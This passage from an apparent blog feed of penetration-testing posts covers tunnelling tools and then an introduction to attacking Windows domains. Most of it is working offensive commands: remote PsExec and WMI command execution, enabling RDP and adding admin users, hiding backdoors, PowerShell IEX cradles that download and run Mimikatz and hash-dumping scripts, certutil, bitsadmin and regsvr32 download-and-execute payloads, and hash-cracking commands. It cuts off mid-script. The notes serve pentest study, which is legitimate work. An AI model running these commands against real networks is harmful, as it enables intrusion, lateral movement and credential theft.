<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./frpc -c frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># service socks</span></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 46075</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = puser</span><br><span class="line">plugin_passwd = ppassword</span><br><span class="line">use_encryption = <span class="literal">true</span></span><br><span class="line">use_compression = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[dns]</span><br><span class="line"><span class="built_in">type</span> = udp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 53</span><br><span class="line">remote_port = 42231</span><br></pre></td></tr></table></figure>

<p>Then we access server 7001 port to connect client 22 port (ssh service), socks and dns are the same.  </p>
<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>It transfers data using web pages (js, php, jsp, asp …).<br>Download it by</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/sensepost/reGeorg.git</span><br></pre></td></tr></table></figure>

<p>On your VPS to build a socks5 proxy</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python reGeorgSocksProxy.py -p 8080 -u http://xx.xx.xx.xx/tunnel.jsp</span><br></pre></td></tr></table></figure>

<p>We use socks5 by connecting VPS_ip:8080</p>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>Edit <code>/etc/sysctl.conf</code> to allow forwarding.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
<p>Then stop the service temporarily.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ service iptables stop</span><br></pre></td></tr></table></figure>
<p>Configure rules. Connect VPS to access target.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ iptables -t nat -A PREROUTING --dst VPS_ip -p tcp --dport VPS_port -j DNAT --to-destination target_ip:target_port</span><br><span class="line"></span><br><span class="line">$ iptables -t nat -A POSTROUTING --dst target_ip -p tcp --dport target_port -j SNAT --to-source VPS_ip</span><br></pre></td></tr></table></figure>
<p>Save configuration and restart service.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>

<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>Productions:<br><a class="link"   href="https://ngork.com/" >ngrok<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.ngork.cc/" >Sunny-Ngrok<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://natapp.cn/" >Natapp<i class="fas fa-external-link-alt"></i></a></p>
<p>Projects:<br><a class="link"   href="https://github.com/SECFORCE/Tunna" >Tunna<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://sourceforge.net/projects/ssocks/" >sSocks<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/ehang-io/nps" >NPS<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/vzex/dog-tunnel" >Dog Tunnel<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/samhocevar/rinetd" >rinetd<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/rssnsj/portfwd" >portfwd<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/cw1997/NATBypass" >NATBypass<i class="fas fa-external-link-alt"></i></a></p>
<p>Tools in <code>Linux</code> repo:<br><code>iptables</code> (before CentOS 7.0), <code>firewall</code> (after CentOS 7.0), <code>netcat</code> (<code>ncat</code>, <code>nc</code>), <code>socat</code></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>Domain Pentest Intro</title>
    <url>/2020/03/12/2020-03-12-Domain-Pentest-Intro/</url>
    <content><![CDATA[<p>Penetration testing is always a hot and attractive technology, and perform penetration testing in the windows domain is a fairly pivot part.</p>
<h2 id="Windows-Domain"><a href="#Windows-Domain" class="headerlink" title="Windows Domain"></a>Windows Domain</h2><h3 id="What-is-it"><a href="#What-is-it" class="headerlink" title="What is it?"></a>What is it?</h3><p>A <code>Domain</code> is a logical environment, which is different from <code>Workgroups</code>, and it aims to organize multiple computers logically in the network for centralized management.</p>
<p><code>Workgroups</code> divides computers into groups simply for better observation, without any futher management.<br>They should come from the same network (LAN), same physical location, and they share some documents, applitions and system resources.</p>
<p><code>Domain</code> also seperates computers into groups where pc share files, but they are under the control of <code>Domain Controller</code>.<br>Different from <code>Workgroups</code> which store policies and passwords locally, in a <code>Domain</code>, (at least) one <code>Domain Controller</code> manage the policies, and saves the password.<br>It’s not your pc to allow you to login, it’s the <code>Domain Controller</code> that checks your username and password.</p>
<p>It also decides whether you can join the <code>Domain</code>. So the <code>Domain Controller</code> is holding the gate of <code>Domain</code>, ensures security and privacy.<br>Besides computers belonging to one <code>Domain</code> can be from different network, different LAN in different physical location.</p>
<h3 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h3><p>After booting up a computer, you can either login into the domain, using <code>Kerberos</code> protocol; or login in this computer, using <code>SAM</code> (Security AccountManager) for <code>NTLM</code> (Windows NT LAN Manager, for pc that not in <code>domain</code>) authentication.</p>
<p>note: <code>SAM</code> is database file storing LM Hash and NTLM Hash.</p>
<p>Domain users can login in every computers instead of the <code>Domain Controller</code>, while <code>Domain Administrator</code> can sign in all the computers.</p>
<h3 id="Pentest-route"><a href="#Pentest-route" class="headerlink" title="Pentest route"></a>Pentest route</h3><p>The main target is to get administrator account in the domain.</p>
<p>In daily working, <code>Domain Administrator</code> may login in users’ pc to help install some softwares or some other stuff, then administrator’s credentials are saved locally, which can be extracted by local user.</p>
<p>So the way to perform penetration is: after controlling one domain member, use it as a springboard to explore all the other members, and find out which one the <code>Domain Administrator</code> logged in.<br>Then we use tools like <code>mimikatz</code> to dump administrator’s credentials, then take charge of <code>Domain Controller</code>, and finally we control the whole domain.</p>
<h3 id="Additional-part"><a href="#Additional-part" class="headerlink" title="Additional part"></a>Additional part</h3><p>What is <code>Active Directory</code> ? You’ll see it when creating a <code>Domain</code> service (AD DS, Active Directory Domain Service). </p>
<p><code>Active Directory</code> is the centralized directory service in large-scale network environment architecture, and a distributed service, builtin in Windows Server.</p>
<p>The <code>Domain Controller</code> are those set up a <code>Active Directory</code>.The <code>Active Directory</code> stores the whole information of windows <code>Domain</code>.</p>
<p>Tree is AD’s data structure. Objects in <code>Active Directory</code> nest like: <code>Domain</code> –&gt; <code>Organization Unit</code> –&gt; <code>Group</code> –&gt; <code>User</code><br><img src="/imghost/dpi/1.png" alt="active directory"></p>
<p>Because built on the tree structure, <code>Domain</code> in <code>Active Directory</code> can form <code>Domain Tree</code>, <code>Domain Forest</code> and <code>Root Domain</code>.<br><img src="/imghost/dpi/2.png" alt="domain tree 1"><br><img src="/imghost/dpi/3.png" alt="domain tree 2"></p>
<p>There is only one <code>Root Domain</code> in a <code>Domain</code>, first created and at the top level, having no parent domain but child domain.</p>
<h2 id="Domain-Pentest-Technologies"><a href="#Domain-Pentest-Technologies" class="headerlink" title="Domain Pentest Technologies"></a>Domain Pentest Technologies</h2><p>All of below works only after you have taken a <code>Domain</code> member.  </p>
<h3 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h3><p>View network environment: <code>ipconfig /all</code><br>View Wifi name: <code>netsh wlan show profile</code><br>View Wifi password: <code>netsh wlan show profile WiFi-name key=clear</code><br>View online users: <code>query user</code></p>
<p>Get all <code>domain</code>: <code>net view /domain</code><br>Get <code>domain controller</code> IP: <code>dsquery server</code><br>Get <code>domain controller</code> host name: <code>net group &quot;domain controllers&quot; /domain</code><br>Get <code>domain administrator</code> user name: <code>net group &quot;domain admins&quot; /domain</code><br>Get all <code>domain</code> users hostnames:<code>net group &quot;domain computers&quot; /domain</code><br>Get all <code>domain</code> users: <code>net user /domain</code><br>Get <code>domain</code> user information: <code>net user &quot;username&quot; /domain</code></p>
<ul>
<li>Here is a special user called <code>krbtgt</code>. It’s used for Kerberos authentication. After obtaining its hash, we can forge a ticket for a pass-the-ticket attack.</li>
</ul>
<p>View current <code>domain</code>: <code>net config workstation</code><br>View <code>domain</code> password policies: <code>net accounts /domain</code><br>View patch information: <code>wmic qfe</code><br>View operating system type: <code>wmic os</code></p>
<p>Check whether admin has logged: <code>tasklist /v  | find &quot;name-of-domain-admin&quot;</code><br>It’s necessary before steal credentials.</p>
<h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p>Based on this, a more automated batch processing script (need a ip.txt, check result.txt at last)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> check ip addr config file…</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> ip.txt <span class="built_in">echo</span> ip addr config file ip.txt does <span class="keyword">not</span> <span class="keyword">exist</span>! &amp; <span class="keyword">goto</span> end</span><br><span class="line"><span class="built_in">echo</span> read and analysis file…</span><br><span class="line"><span class="keyword">for</span> /F &quot;eol=#&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> &amp;(<span class="built_in">echo</span> <span class="variable">%%i</span> &amp;tasklist /s <span class="variable">%%i</span> /u administrator /p urpassword /v) &gt;&gt;k:\<span class="built_in">path</span>\to\result.txt</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>Use <code>nbtscan</code> to find host: <code>nbtscan xxx.xxx.xxx.xxx/24</code><br>Use <code>netbios</code> to get host MAC: <code>nbtstat -A xxx.xxx.xxx.xxx</code><br>Use <code>cmd</code> to scan the host: <code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 x.x.x.%I | findstr &quot;TTL=&quot;</code></p>
<p>Use <code>powershell</code> script to scan hosts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR x.x.x.x/20&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>
<p>Or load remote script to scan</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27; https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1&#x27;);Invoke-Portscan -StartAddress x.x.x.<span class="number">1</span> -EndAddress x.x.x.<span class="number">255</span> -ResolveHost</span><br></pre></td></tr></table></figure>

<p>Use <code>powershell</code> script to scan ports</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-Portscan.ps1;Invoke-Portscan -StartAddress 192.168.52.1 -EndAddress 192.168.52.255 -ResolveHost&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>
<p>Or load remote script to scan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27; https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -StartAddress 192.168.52.1 -EndAddress 192.168.52.255 -ResolveHost</span><br></pre></td></tr></table></figure>

<h3 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h3><p>If <code>Domain Admin</code> didn’t logged in this pc, we have to find one that has been logged.</p>
<p>If we get one local administrator account, use <code>net use</code> to build <code>IPC$</code> connection, or use <code>wmic</code> commands or <code>rdp</code> or <code>psexec</code> to build connection.</p>
<h4 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h4><p>With it you are able to use pentest tools on your pc, to scan or attack target in <code>Domain</code>, through <code>Domain</code> network route.</p>
<p>Netsh(network shell) is a command-line utility included in Microsoft’s Windows NT line of operating systems beginning with Windows 2000. It allows local or remote configuration of network devices, like iptables on Linux. </p>
<p>Port forwarding can be done via <code>netsh</code> by adding a forwarding rule. Transfer data from local_ip:local_port to target_ip:target_port as below.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy add v4tov4 listenaddress=local_ip listenport=local_port connectaddress=target_ip connectport=target_port</span><br></pre></td></tr></table></figure>
<p>Show current rules</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy show all</span><br><span class="line">...</span><br><span class="line"><span class="variable">$</span> netsh interface portproxy dump</span><br><span class="line"></span><br><span class="line"><span class="comment">#========================</span></span><br><span class="line"><span class="comment"># Port Proxy configuration</span></span><br><span class="line"><span class="comment">#========================</span></span><br><span class="line"><span class="built_in">pushd</span> interface portproxy</span><br><span class="line">reset</span><br><span class="line">add v4tov4 listenport=local_port connectaddress=target_ip connectport=target_port</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="comment"># End of Port Proxy configuration</span></span><br></pre></td></tr></table></figure>
<p>Delete the forwarding rule.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy delete v4tov4 listenport=local_port</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="variable">$</span> netsh interface portproxy delete v4tov4 listenport=local_port listenaddress=local_ip</span><br><span class="line"><span class="comment"># or clean all</span></span><br><span class="line"><span class="variable">$</span> netsh interface portproxy reset</span><br></pre></td></tr></table></figure>
<p>Ipv6 is needed on Widows XP.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
<p>Choose a protocol.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> netsh interface portproxy add v4tov4 listenport=local_port connectport=target_ip connectaddress= target_ip protocol=tcp</span><br></pre></td></tr></table></figure>
<p>Attention: only <code>tcp</code> permitted, and <code>127.0.0.1</code> is not allowed, please use 0.0.0.0 or leave &#96;listenaddress omitted to stand localhost.</p>
<h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>View target share resources: <code>net view \\IP</code><br>View target time: <code>net time \\IP</code><br>Build IPC null connection: <code>net use \\xxx.xxx.xxx.xxx\ipc$ &quot;&quot; /user:&quot;domain\username&quot;</code><br>Build IPC connection(not null): <code>net use \\xxx.xxx.xxx.xxx\ipc$ &quot;password&quot; /user:&quot;domain\username&quot;</code><br>Delete IPC connection: <code>net use \\xxx.xxx.xxx.xxx\ipc$ /del</code><br>Having a IPC connection and privileges, mapping target disk <code>c:</code> to local disk <code>z:</code> : <code>net use z: \\xxx.xxx.xxx.xxx\c$</code><br>Delete mapping: <code>net use z: /del</code><br>Close default IPC share: <code>net use ipc$ /del</code></p>
<p>note:</p>
<ol>
<li>IPC null connection is discarded in most windows os nowadays.</li>
<li>No IPC connecting if pot 139 and 445 on target host are closed&#x2F;filtered.</li>
</ol>
<p>After IPC connection, we can do:</p>
<ul>
<li>copy file to target: <code>copy \path\to\shell.exe \\x.x.x.x\share\to\folder</code></li>
<li>add scheduled tasks: <code>at \\x.x.x.x  20:20:00 shell.exe</code> (or schtasks)</li>
<li>…</li>
</ul>
<p>When PC version is higher than Win7, use <code>schtasks</code> rather than <code>at</code>.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Create</span></span><br><span class="line">schtasks /create /tn <span class="string">&quot;test&quot;</span> /tr c:\rabbit.exe /<span class="built_in">sc</span> once /st <span class="number">10</span>:<span class="number">02</span> /S <span class="number">192.168</span>.<span class="number">15.181</span> /RU System  /u rabbitmask /p <span class="string">&quot;password&quot;</span><span class="comment"># check the task (check all tasks if no &#x27;/tn test&#x27;)</span></span><br><span class="line">schtasks /Query /tn test /s <span class="number">192.168</span>.<span class="number">15.181</span> /u rabbitmask /p password</span><br><span class="line"><span class="comment">#Delete</span></span><br><span class="line">schtasks /Delete /tn test /F /s <span class="number">192.168</span>.<span class="number">15.181</span> /u rabbitmask /p password</span><br><span class="line"><span class="comment">#Explaination</span></span><br><span class="line">/create     -- create tasks</span><br><span class="line">/tn         -- task name</span><br><span class="line">/tr         -- task file</span><br><span class="line">/<span class="built_in">sc</span>         -- job frequency</span><br><span class="line">/st         -- <span class="built_in">start</span> time</span><br><span class="line">/s          -- remote ip/name</span><br><span class="line">/ru         -- user privilege</span><br></pre></td></tr></table></figure>

<h4 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h4><p>PsTools is a set of remote management tools provided by Microsoft. As long as the account password is known, the firewall opens 445 to connect to remote computer, these console tools can be used.</p>
<p>Get reverse cmdshell in batch processing (needs to prepare scaned hosts ip.txt)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> check ip addr config file…</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> ip.txt <span class="built_in">echo</span> ip addr config file ip.txt does <span class="keyword">not</span> <span class="keyword">exist</span>! &amp; <span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> read and analysis file…</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /F &quot;eol=#&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> <span class="built_in">start</span> PsExec.exe \\<span class="variable">%%i</span> -accepteula -u administrator -p &quot;urpassword&quot; <span class="built_in">cmd</span> &amp; <span class="built_in">start</span> <span class="built_in">cmd</span> /c PsExec.exe \\<span class="variable">%%i</span> -u administrator -p &quot;urpassword&quot; <span class="built_in">cmd</span></span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.232</span> /user:fanxing.com\fanxing /password:admin@<span class="number">163</span>.com <span class="keyword">process</span> call create <span class="string">&quot;cmd /c 1.exe&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><p>To control remote desktop, first check whether rdp servoce is on: <code>netstat -ano | find &quot;3389&quot;</code><br>If no echo, start it by: <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> </p>
<p>Then you can choose to </p>
<ul>
<li><p>dump hash</p>
<ul>
<li>os before server 2003 using <code>LM HASH</code> which is reversible</li>
<li>later os using <code>NTLM HASH</code> and dump only hash (no password in plaintext)</li>
</ul>
</li>
<li><p>add user</p>
<ul>
<li>easy to be detected</li>
<li>but it works</li>
</ul>
</li>
</ul>
<p>Add user: <code>net user testuser testpasswd /add</code><br>Add as administrator: <code>net localgroup administrators testuser /add</code><br>Check status: <code>net user testuser</code></p>
<h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li>PsExec</li>
<li>wmi<ul>
<li>wmic</li>
<li>wmiexec.vbs</li>
<li>Invoke-WMIMethod</li>
</ul>
</li>
<li>WinRM</li>
<li>DCOM</li>
<li>WCE</li>
</ul>
<p>Using pentest framework is easier, and before it, using <code>powerview</code> and <code>BloodHound</code> to gather information benefits a lot.</p>
<h3 id="Penetration-Testing-Persistence"><a href="#Penetration-Testing-Persistence" class="headerlink" title="Penetration Testing Persistence"></a>Penetration Testing Persistence</h3><p>To keep controlling and convenient for later connection, pentesters always leave a backdoor, timed task or something in the target pc.</p>
<h4 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h4><ul>
<li>Normal webshell</li>
<li>Windows registry</li>
<li>Logon scripts</li>
<li>DLL&#x2F;COM injection</li>
<li>Scheduled tasks (<code>at</code>, <code>schtasks</code>)</li>
<li>wmi</li>
</ul>
<h4 id="Useful-Directory"><a href="#Useful-Directory" class="headerlink" title="Useful Directory"></a>Useful Directory</h4><p>Best place to put backdoor is somewhere user cannot see easily –&gt; the <code>System Volume Information</code> directory. </p>
<p>It is hidden for normal users, even for administrator, and is only accessed by <code>system</code>. use <code>c:/system~l</code> to access <code>c:/System Volume Information</code>.</p>
<h4 id="Tools-1"><a href="#Tools-1" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li><a href="#Pentest-framework">Pentest framework</a></li>
<li>Powershell </li>
<li>NC</li>
</ul>
<p>More in <a href="/2021/02/18/2021-02-18-About-Pentest-Persistence/">About Pentest Persistence</a></p>
<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Only when you get system (beyond administrator) privilege, can you wholly control the computer.</p>
<h4 id="Methods-1"><a href="#Methods-1" class="headerlink" title="Methods"></a>Methods</h4><ul>
<li>Public exploit or CVE</li>
<li>Using AD features</li>
<li>DLL&#x2F;COM injection</li>
<li>Using third-party high-privilege services</li>
<li>Forge token</li>
<li>Bypass UAC</li>
</ul>
<h4 id="Tools-2"><a href="#Tools-2" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li><a href="#Pentest-framework">Pentest framework</a></li>
<li>UACME</li>
<li>Forge token<ul>
<li>Incognito</li>
<li>Powershell – Invoke-TokenManipulation.ps1</li>
<li>Cobalt Strike – steal_token</li>
</ul>
</li>
</ul>
<p>More in <a href="/2021/02/19/2021-02-19-About-Privilege-Escalation/">About Privilege Escalation</a></p>
<h3 id="Steal-Credentials"><a href="#Steal-Credentials" class="headerlink" title="Steal Credentials"></a>Steal Credentials</h3><p>All accounts who logged in this pc will leave their credentials locally, which can be dumped by tools.</p>
<p>Bad things happen if <code>Domain Admin</code> logged in this pc and got hash stolen.</p>
<h4 id="Basic-Methods"><a href="#Basic-Methods" class="headerlink" title="Basic Methods"></a>Basic Methods</h4><ul>
<li>Export <code>SAM</code> file to extract</li>
<li>Access <code>lsass.exe</code> process to get hash</li>
<li>Exploit other vlunerabilities to get</li>
</ul>
<h4 id="Simple-Examples"><a href="#Simple-Examples" class="headerlink" title="Simple Examples"></a>Simple Examples</h4><p>Capture plaintext password</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts</span><br></pre></td></tr></table></figure>
<p>Capture hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-Hash"><a href="#Exploit-Hash" class="headerlink" title="Exploit Hash"></a>Exploit Hash</h4><ul>
<li>LM Hash<ol>
<li>john –format&#x3D;lm hash.txt</li>
<li>hashcat -m 3000 -a 3 hash.txt</li>
</ol>
</li>
<li>NTLM Hash<ol>
<li>john –format&#x3D;nt hash.txt</li>
<li>hashcat -m 1000 -a 3 hash.txt</li>
</ol>
</li>
<li>Net-NTLMv1<ol>
<li>john –format&#x3D;netntlm hash.txt</li>
<li>hashcat -m 5500 -a 3 hash.txt</li>
</ol>
</li>
<li>Net-NTLMv2<ol>
<li>john –format&#x3D;netntlmv2 hash.txt</li>
<li>hashcat -m 5600 -a 3 hash.txt</li>
</ol>
</li>
</ul>
<h4 id="Tools-3"><a href="#Tools-3" class="headerlink" title="Tools"></a>Tools</h4><ul>
<li>mimikatz</li>
<li>procdump</li>
<li>QuarksPwDump</li>
<li>LaZagne</li>
<li>WCE</li>
<li>Invoke-WCMDump</li>
<li>fgdump</li>
<li>mimipenguin</li>
</ul>
<h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><p>Tickets of every <code>Domain Member</code> are calculated using hash of <code>krbtgt</code> password, which is normally not changed.<br>If we control <code>krbtgt</code> or get its password, we can forge any member’s ticket, which is called <code>Golden Ticket</code>.<br>We can easily take over <code>Domain Controller</code> using <code>Domain Admin</code> password.</p>
<p>In windows <code>Domain</code> it is associated with <code>Kerberos</code>. Use msf and mimikatz to exploit with ms14-068.</p>
<h3 id="Download-Methods-from-3gstudent"><a href="#Download-Methods-from-3gstudent" class="headerlink" title="Download Methods (from 3gstudent)"></a>Download Methods (from <a class="link"   href="https://github.com/3gstudent" >3gstudent<i class="fas fa-external-link-alt"></i></a>)</h3><p>From <code>cmd</code>:</p>
<ul>
<li>powershell<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;https://github.com/3gstudent/test/raw/master/putty.exe&#x27;</span>,<span class="string">&#x27;c:\download\a.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="string">&#x27;c:\download\a.exe&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>certutil<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> https://github.com/<span class="number">3</span>gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</span><br></pre></td></tr></table></figure></li>
<li>bitsadmin (bit of slow)<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; bitsadmin /transfer n http://github.com/<span class="number">3</span>gstudent/test/raw/master/putty.exe c:\download\a.exe &amp;&amp; c:\download\a.exe</span><br></pre></td></tr></table></figure></li>
<li>regsvr32<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Route 1: regsvr32 -&gt; JScript -&gt; powershell -&gt; download &amp; exec</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec.sct scrobj.dll</span><br><span class="line"><span class="comment"># JScript call powershell to download &amp; execute by:</span></span><br><span class="line">&gt; new ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;https://github.com/3gstudent/test/raw/master/putty.exe&#x27;,&#x27;c:\\download\\a.exe&#x27;);start-process &#x27;c:\\download\\a.exe&#x27;&quot;</span>,<span class="number">0</span>,true);</span><br><span class="line"><span class="comment"># sct file format can refer to:</span></span><br><span class="line">https://raw.githubusercontent.com/<span class="number">3</span>gstudent/SCTPersistence/master/calc.sct</span><br><span class="line"><span class="comment"># so the final payload:</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec.sct scrobj.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># Route 2: regsvr32 -&gt; VBScript -&gt; download&amp;exec</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec2.sct scrobj.dll</span><br><span class="line"><span class="comment"># VBScript download by:</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#x27; using Msxml2.XMLHTTP, cannot download https resources</span></span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.81.192/putty.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\download\a.exe&quot;</span></span><br><span class="line">ado.Close</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; using Msxml2.ServerXMLHTTP.6.0</span></span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;Msxml2.ServerXMLHTTP.6.0&quot;</span>)</span><br><span class="line">http.SetOption <span class="number">2</span>, <span 